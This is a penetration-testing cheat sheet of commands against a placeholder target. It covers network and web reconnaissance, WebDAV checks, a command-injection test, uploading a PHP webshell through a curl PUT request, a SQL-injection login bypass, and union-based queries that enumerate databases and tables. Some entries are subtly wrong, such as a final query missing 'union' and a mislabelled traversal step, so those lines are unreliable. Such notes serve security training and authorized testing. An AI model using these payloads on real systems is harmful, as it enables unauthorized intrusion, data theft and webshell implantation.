### Recon
##### NetDiscover
```
netdiscover -r x.x.x.x
```
##### Nmap
```
nmap -A -T5 x.x.x.x -p- -vv
nmap -sS x.x.x.x -p- --min-rate 10000
nmap --script=scriptname.nse x.x.x.x -vv
```
- HTTP Enum with nmap
```
nmap -sV -n -Pn x.x.x.x -vv -p 80 --script=http-vhosts,http-userdir-enum,http-apache-negotiation,http-backup-finder,http-config-backup,http-default-accounts,http-methods,http-method-tamper,http-passwd,http-robots.txt 
```
##### AutoRecon
```
python3 autorecon.py -ct 4 -cs x.x.x.x
````
##### Nikto
```
nikto -h x.x.x.x
```
##### GoBuster
```
gobuster -u x.x.x.x
gobuster dir -u http://x.x.x.x -w /usr/share/wordlists/dirb/common.txt
gobuster -u http://x.x.x.x -w /usr/share/wordlists/dirbuster/directory-list-lowercase-2.3-small.txt -x php
gobuster -s 200,204,301,302,307,403 -u x.x.x.x
```
##### Wfuzz
```
wfuzz -c -w /usr/share/seclists/Discovery/Web_Content/common.txt --hc 404 x.x.x.x/FUZZ
wfuzz -c -w /usr/share/seclists/Discovery/Web_Content/common.txt -R 3 --sc 200 x.x.x.x/FUZZ
wfuzz -c -z file,/root/.ZAP/fuzzers/dirbuster/directory-list-2.3-big.txt --sc 200 http://x.x.x.x/FUZZ.php
wfuzz --hw=1 --hh=3076 -w seclist_common_wordlist.txt http://x.x.x.x/FUZZ
```
##### WpScan
```
wpscan --url http://x.x.x.x --enumerate u,p,t
```
##### SNMPWalk
```
snmpwalk -c public -v1 x.x.x.x
````
##### Webdav
- Incorrect permissions test 
```
cadaver http://x.x.x.x
davtest http://x.x.x.x
```
##### Command Injection
- File Traverse:
```
x.x.x.x/file.php?cmd=ls
```
- Test file upload with curl
```
curl -vX options http://x.x.x.x 
```
- Upload file using curl to website with PUT option available
```
curl --upload-file shell.php --url http://x.x.x.x
```
##### Login Bypass
```
john ' or '1'='1
```
- Enter into username and password
##### Determine vulnerable columns or column that is visible
```
param=' or 1=0 union select null,null,null
param=' or 1=0 union select 1,2,3
```
- Else try
```
param=' or 1=1 union select table_name,null,null from information_schema.tables
```
- If it produces an error try table_name at other positions
- Say Column 1 and 2 are visible from the above queries
- Further Enumerate
```
param=' or 1=0 union select table_schema,null,null from information_schema.columns
```
-Display all databse names
```
param=' or 1=0 union select table_name,null,null from information_schema.columns
```
- Display all table names
```
param=' or 1=1 select table_name,null,null from information_schema.columns where table_schema='public'
```
- Display tables inside public databse

